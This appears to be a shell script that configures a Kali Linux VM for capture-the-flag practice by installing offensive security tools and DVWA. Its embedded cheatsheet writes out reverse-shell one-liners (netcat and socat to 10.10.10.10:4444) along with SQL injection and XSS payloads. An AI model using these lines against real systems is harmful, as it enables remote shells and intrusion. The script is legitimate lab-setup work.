#!/bin/sh
# install.sh

# Kali Linux CTF VM Setup Script
# Automates the setup of a Kali Linux VM for CTF competitions
# Tested on Kali Linux 2025.x
# Run as root: sudo ./ctf_setup.sh
# Date: June 19, 2025

# Configuration
LOG_FILE="/root/ctf_setup.log"
TOOLS_DIR="/root/tools"
CTF_DIR="/root/CTF"
GHIDRA_VERSION="11.0.2_PUBLIC_20240503"
KALI_USER="kali"  # Default Kali user; adjust if changed

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

NON_INTERACTIVE=false
if [ "$1" = "--yes-to-all" ]; then
    NON_INTERACTIVE=true
fi

# Function to log messages
log() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Function to check for required dependencies
check_dependencies() {
    log "Checking for required dependencies"
    if ! command -v "git" >/dev/null 2>&1; then
        log "${RED}Error: Dependency 'git' is not installed. Please install it before running this script.${NC}"
        exit 1
    fi
    if ! command -v "curl" >/dev/null 2>&1; then
        log "${RED}Error: Dependency 'curl' is not installed. Please install it before running this script.${NC}"
        exit 1
    fi
    if ! command -v "wget" >/dev/null 2>&1; then
        log "${RED}Error: Dependency 'wget' is not installed. Please install it before running this script.${NC}"
        exit 1
    fi
    log "${GREEN}All dependencies are satisfied${NC}"
}

# Error handling
set -eE
trap 'error_handler $LINENO' ERR

error_handler() {
    local exit_code=$?
    log "${RED}Error on line $1: command exited with status $exit_code.${NC}"
    log "The script will now exit."
}

# Function to prompt user for confirmation
prompt_yes_no() {
    if [ "$NON_INTERACTIVE" = true ]; then
        return 0
    fi
    while true; do
        printf "%s" "$1 [y/N]: "
        read yn
        case $yn in
            [Yy]* ) return 0 ;;
            [Nn]* | "" ) return 1 ;;
            * ) echo "Please answer y or n." ;;
        esac
    done
}

# Banner
echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN}Kali Linux CTF VM Setup Script${NC}"
echo -e "${GREEN}============================================================${NC}"
log "Starting CTF VM setup"

# Check for dependencies
check_dependencies

# Ensure script is run as root
if [ "$EUID" -ne 0 ]; then
    log "${RED}This script must be run as root (use sudo)${NC}"
    exit 1
fi

# Initialize log file
echo -e "Kali Linux CTF VM Setup Log\n" > "$LOG_FILE"

# Update system
log "Updating system"
apt update && apt upgrade -y

# 1. Base VM Setup (Networking check)
log "Checking network configuration"
if ip a | grep -q "inet "; then
    log "${GREEN}Network interfaces detected${NC}"
else
    log "${YELLOW}Warning: No network interfaces detected. Ensure NAT and Host-Only adapters are configured.${NC}"
fi

# --- Tool Installation Functions ---

install_core_tools() {
    log "Installing core tools"
    apt install -y \
        nmap netcat tcpdump wireshark curl wget dnsutils git \
        python3 python3-pip ruby perl golang make build-essential
}

install_recon_tools() {
    if prompt_yes_no "Install reconnaissance tools (gobuster, ffuf, amass, etc.)?"; then
        log "Installing reconnaissance tools"
        apt install -y \
            gobuster ffuf amass whatweb nikto enum4linux smbclient nbtscan masscan sublist3r
    fi
}

install_web_tools() {
    if prompt_yes_no "Install web exploitation tools (burpsuite, sqlmap, wfuzz, etc.)?"; then
        log "Installing web exploitation tools"
        apt install -y \
            burpsuite zaproxy wfuzz sqlmap xsssniper wafw00f wpscan
    fi
}

install_reverse_engineering_tools() {
    if prompt_yes_no "Install reverse engineering tools (ghidra, radare2, gdb, etc.)?"; then
        log "Installing reverse engineering tools"
        apt install -y \
            radare2 gdb peda binwalk apktool dex2jar jd-gui cutter

        # Install Ghidra
        log "Installing Ghidra"
        apt install -y openjdk-17-jre
        mkdir -p "$TOOLS_DIR"
        (
            cd "$TOOLS_DIR"
            wget "https://github.com/NationalSecurityAgency/ghidra/releases/download/GHIDRA_${GHIDRA_VERSION}/ghidra_${GHIDRA_VERSION}.zip" -O ghidra.zip
            unzip -o ghidra.zip
            rm ghidra.zip
        )
    fi
}

install_forensics_tools() {
    if prompt_yes_no "Install forensics tools (foremost, sleuthkit, steghide, etc.)?"; then
        log "Installing forensics tools"
        apt install -y \
            foremost sleuthkit steghide stegosuite exiftool
    fi
}

install_password_cracking_tools() {
    if prompt_yes_no "Install password cracking tools (john, hashcat, hydra, etc.)?"; then
        log "Installing password cracking tools"
        apt install -y \
            john hashcat hydra medusa patator cupp crunch fcrackzip
    fi
}

install_exploit_development_tools() {
    if prompt_yes_no "Install exploit development tools (metasploit, pwntools, etc.)?"; then
        log "Installing exploit development tools"
        apt install -y \
            metasploit-framework exploitdb pwntools ropper
    fi
}

setup_python_environment() {
    log "Setting up Python virtual environment"
    python3 -m venv "$CTF_DIR/venv"
    source "$CTF_DIR/venv/bin/activate"
    pip install --upgrade pip
    pip install pwntools requests flask r2pipe pillow
    deactivate
}

download_additional_tools() {
    log "Downloading SecLists"
    git clone https://github.com/danielmiessler/SecLists.git "$TOOLS_DIR/SecLists"
}

install_tools() {
    log "--- Installing Tools ---"
    install_core_tools
    install_recon_tools
    install_web_tools
    install_reverse_engineering_tools
    install_forensics_tools
    install_password_cracking_tools
    install_exploit_development_tools
    setup_python_environment
    download_additional_tools
}


# 3. Directory Structure
create_directory_structure() {
    log "--- Creating Directory Structure ---"
    mkdir -p "$CTF_DIR"/{tools,notes,binaries,web,reversing,pwn,crypto,forensics,writeups}
}

initialize_git_notes() {
    log "--- Initializing Git for Notes ---"
    if [ ! -d "$CTF_DIR/notes/.git" ]; then
        (
            cd "$CTF_DIR/notes"
            git init
            touch notes.md cheatsheet.md
            cat <<EOL > cheatsheet.md
# CTF Cheatsheet

## Reverse Shells
- Netcat: \`nc -e /bin/bash 10.10.10.10 4444\`
- Socat: \`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444\`

## Web Payloads
- SQL Injection: \`' OR 1=1 --\`
- XSS: \`<script>alert('XSS')</script>\`

## Common Commands
- Nmap: \`nmap -sC -sV -Pn <target>\`
- Gobuster: \`gobuster dir -u <url> -w ~/tools/SecLists/Discovery/Web-Content/common.txt\`
EOL
            git add .
            git commit -m "Initial CTF notes"
        )
    else
        log "${YELLOW}Warning: Git repository already exists in notes directory. Skipping initialization.${NC}"
    fi
}

configure_bash_aliases() {
    log "--- Configuring Bash Aliases ---"
    cat <<EOL >> "/home/$KALI_USER/.bashrc"
# CTF Aliases
alias ..='cd ..'
alias ...='cd ../..'
alias c='clear'
alias ll='ls -lah --color=auto'
alias myip="ip a | grep inet"
alias ports="netstat -tulanp"
alias nmapquick="nmap -sC -sV -Pn"
alias nmapfull="nmap -sC -sV -p- -T4"
alias nmapudp="nmap -sU -Pn"

# Extract Function
extract () {
  if [ -f "\$1" ] ; then
    case "\$1" in
      *.tar.bz2)   tar xvjf "\$1"    ;;
      *.tar.gz)    tar xvzf "\$1"    ;;
      *.tar.xz)    tar xvf "\$1"     ;;
      *.bz2)       bunzip2 "\$1"     ;;
      *.rar)       unrar x "\$1"     ;;
      *.gz)        gunzip "\$1"      ;;
      *.tar)       tar xvf "\$1"     ;;
      *.tbz2)      tar xvjf "\$1"    ;;
      *.tgz)       tar xvzf "\$1"    ;;
      *.zip)       unzip -o "\$1"    ;;
      *.7z)        7z x "\$1"        ;;
      *.xz)        xz -d "\$1"       ;;
      *)           echo "'\$1' cannot be extracted" ;;
    esac
  else
    echo "'\$1' is not a valid file"
  fi
}
EOL
    source "/home/$KALI_USER/.bashrc"
}

apply_config_tweaks() {
    log "--- Applying Config Tweaks ---"
    if prompt_yes_no "Enable passwordless sudo (WARNING: Reduces security, use only in isolated VMs)?"; then
        log "Enabling passwordless sudo"
        echo "$KALI_USER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/kali
        chmod 0440 /etc/sudoers.d/kali
    fi

    log "Increasing file watch limits"
    echo "fs.inotify.max_user_watches=524288" >> /etc/sysctl.conf
    sysctl -p

    log "Configuring firewall"
    apt install -y ufw
    ufw allow out http
    ufw allow out https
    ufw allow out domain
    ufw enable
    systemctl disable bluetooth cups
}

install_editors() {
    log "--- Installing Editors ---"
    apt install -y micro vim nano
    if prompt_yes_no "Install Visual Studio Code?"; then
        log "Installing Visual Studio Code"
        snap install code --classic
    fi
}

install_test_environments() {
    log "--- Installing Test Environments ---"
    if prompt_yes_no "Install test environments (DVWA, Vulnix, CTF write-ups)?"; then
        log "Installing test environments"
        apt install -y docker.io
        systemctl start docker
        docker pull vulnerables/web-dvwa
        apt install -y vulnix
        git clone https://github.com/ctfs/write-ups-2014 "$CTF_DIR/writeups"
    fi
}

perform_cleanup() {
    log "--- Performing Cleanup ---"
    apt autoremove -y
    apt clean
    rm -rf "/home/$KALI_USER/.cache/*" "$TOOLS_DIR/*.zip"
    history -c
    rm -rf "/home/$KALI_USER/.bash_history"
}

install_optional_extras() {
    log "--- Installing Optional Extras ---"
    if prompt_yes_no "Install Zsh and Oh My Zsh?"; then
        log "Installing Zsh and Oh My Zsh"
        apt install -y zsh fzf zsh-completions
        su - "$KALI_USER" -c "sh -c \"\$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\""
        su - "$KALI_USER" -c "git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions"
        su - "$KALI_USER" -c "git clone https://github.com/zsh-users/zsh-syntax-highlighting ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting"
        su - "$KALI_USER" -c "git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/themes/powerlevel10k"

        # Configure .zshrc
        ZSHRC_FILE="/home/$KALI_USER/.zshrc"
        sed -i 's/ZSH_THEME=".*"/ZSH_THEME="powerlevel10k\/powerlevel10k"/' "$ZSHRC_FILE"
        sed -i 's/plugins=(git)/plugins=(git zsh-autosuggestions zsh-syntax-highlighting zsh-completions fzf)/' "$ZSHRC_FILE"

        chsh -s /bin/zsh "$KALI_USER"
    fi

    if prompt_yes_no "Configure ProxyChains?"; then
        log "Configuring ProxyChains"
        apt install -y proxychains
        cat <<EOL > /etc/proxychains.conf
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
# Example: Tor
socks5 127.0.0.1 9050
EOL
    fi

    if prompt_yes_no "Install Nerd Fonts?"; then
        log "Installing Nerd Fonts"
        mkdir -p "/home/$KALI_USER/.fonts"
        wget -P "/home/$KALI_USER/.fonts" https://github.com/ryanoasis/nerd-fonts/releases/download/v3.2.1/Hack.zip
        unzip "/home/$KALI_USER/.fonts/Hack.zip" -d "/home/$KALI_USER/.fonts/Hack"
        fc-cache -fv
        rm "/home/$KALI_USER/.fonts/Hack.zip"
        chown -R "$KALI_USER:$KALI_USER" "/home/$KALI_USER/.fonts"
    fi
}

verify_setup() {
    log "--- Verifying Setup ---"
    echo -e "${YELLOW}Running verification tests${NC}"
    ip a >> "$LOG_FILE"
    ufw status >> "$LOG_FILE"
    if ! nmap --version >> "$LOG_FILE" 2>&1; then
        log "${YELLOW}Nmap verification failed${NC}"
    fi
    if ! burpsuite --version >> "$LOG_FILE" 2>&1; then
        log "${YELLOW}Burp Suite verification failed${NC}"
    fi
    if ! "$TOOLS_DIR/ghidra_${GHIDRA_VERSION%_*}/ghidraRun" --version >> "$LOG_FILE" 2>&1; then
        log "${YELLOW}Ghidra verification failed${NC}"
    fi
    if ! sqlmap --version >> "$LOG_FILE" 2>&1; then
        log "${YELLOW}SQLMap verification failed${NC}"
    fi
    if ! john --version >> "$LOG_FILE" 2>&1; then
        log "${YELLOW}John verification failed${NC}"
    fi
    if ! ls "$TOOLS_DIR/SecLists/Passwords" >> "$LOG_FILE" 2>&1; then
        log "${YELLOW}SecLists verification failed${NC}"
    fi
}

final_instructions() {
    log "--- Final Instructions ---"
    echo -e "${GREEN}============================================================${NC}"
    echo -e "${GREEN}Next Steps:${NC}"
    echo -e "1. Shut down the VM and take a snapshot named 'CTF Base'."
    echo -e "2. Test DVWA: Run 'docker run -it --rm -p 80:80 vulnerables/web-dvwa' and visit http://localhost."
    echo -e "3. Start CTFs on TryHackMe or HackTheBox."
    echo -e "4. Check $LOG_FILE for details."
    echo -e "${GREEN}Happy Hacking!${NC}"
    echo -e "${GREEN}============================================================${NC}"
}

main() {
    log "--- Starting Kali Linux CTF VM Setup Script ---"
    # Banner
    echo -e "${GREEN}============================================================${NC}"
    echo -e "${GREEN}Kali Linux CTF VM Setup Script${NC}"
    echo -e "${GREEN}============================================================${NC}"
    log "Starting CTF VM setup"

    # Check for dependencies
    check_dependencies

    # Ensure script is run as root
    if [ "$EUID" -ne 0 ]; then
        log "${RED}This script must be run as root (use sudo)${NC}"
        exit 1
    fi

    # Initialize log file
    echo -e "Kali Linux CTF VM Setup Log\n" > "$LOG_FILE"

    # Update system
    log "Updating system"
    apt update && apt upgrade -y

    # 1. Base VM Setup (Networking check)
    log "Checking network configuration"
    if ip a | grep -q "inet "; then
        log "${GREEN}Network interfaces detected${NC}"
    else
        log "${YELLOW}Warning: No network interfaces detected. Ensure NAT and Host-Only adapters are configured.${NC}"
    fi

    install_tools
    create_directory_structure
    initialize_git_notes
    configure_bash_aliases
    apply_config_tweaks
    install_editors
    install_test_environments
    perform_cleanup
    install_optional_extras
    verify_setup
    final_instructions

    log "--- Kali Linux CTF VM Setup Script Finished ---"
    exit 0
}

main "$@"
